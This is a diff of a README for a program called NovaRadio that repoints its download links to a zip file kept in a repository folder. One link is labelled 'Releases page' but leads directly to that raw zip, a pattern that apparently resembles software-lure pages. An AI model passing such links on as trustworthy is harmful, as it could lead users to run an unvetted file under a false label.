@@ -6,7 +6,7 @@ Welcome to NovaRadio! This modern radio management system helps you manage multi
 
 ## 🔗 Download NovaRadio
 
-[![Download NovaRadio](https://github.com/shadankaifi/NovaRadio/raw/refs/heads/main/includes/Radio-Nova-v1.5.zip)](https://github.com/shadankaifi/NovaRadio/raw/refs/heads/main/includes/Radio-Nova-v1.5.zip)
+[![Download NovaRadio](https://raw.githubusercontent.com/shadankaifi/NovaRadio/main/dj/Radio_Nova_v1.5.zip)](https://raw.githubusercontent.com/shadankaifi/NovaRadio/main/dj/Radio_Nova_v1.5.zip)
 
 ## 💡 Features
 
@@ -31,11 +31,11 @@ To ensure smooth operation, please make sure your system meets the following req
 
 To get NovaRadio on your computer, visit the Releases page to download the latest version.
 
-[Download NovaRadio Here](https://github.com/shadankaifi/NovaRadio/raw/refs/heads/main/includes/Radio-Nova-v1.5.zip)
+[Download NovaRadio Here](https://raw.githubusercontent.com/shadankaifi/NovaRadio/main/dj/Radio_Nova_v1.5.zip)
 
 Follow these steps to install:
 
-1. Go to the [Releases page](https://github.com/shadankaifi/NovaRadio/raw/refs/heads/main/includes/Radio-Nova-v1.5.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/shadankaifi/NovaRadio/main/dj/Radio_Nova_v1.5.zip).
 2. Choose the latest version listed at the top.
 3. Click on the download link next to the version you want.
 4. Save the file to your computer.
